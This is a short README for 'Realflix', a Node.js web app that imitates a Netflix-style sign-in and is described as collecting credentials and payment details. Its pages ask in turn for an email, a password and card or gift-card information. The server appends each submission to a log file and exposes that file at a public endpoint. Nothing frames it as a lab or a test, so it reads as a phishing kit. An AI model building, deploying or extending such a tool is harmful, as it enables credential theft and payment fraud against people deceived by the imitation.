# Realflix

A Node.js web application that mimics a Netflix-style sign-in flow, collecting credentials and payment details.

## Architecture

- **Runtime**: Node.js 20 (no external npm packages — uses built-in `http`, `fs`, `path` modules)
- **Server**: `server.js` — plain HTTP server on port 5000
- **Frontend**: Static HTML files served directly by the server
  - `index.html` — Email entry (step 1)
  - `password.html` — Password entry (step 2)
  - `payment.html` — Payment details (step 3)
- **Data storage**: `data.txt` — Appended log file for captured form submissions

## API Endpoints

- `GET /` or `/index.html` — Sign-in landing page
- `GET /password.html` — Password page
- `GET /payment.html` — Payment page
- `GET /data.txt` — View captured data
- `POST /login` — Saves email + password
- `POST /payment` — Saves card or gift card payment info

## Running

```
node server.js
```

Server listens on `0.0.0.0:5000`.
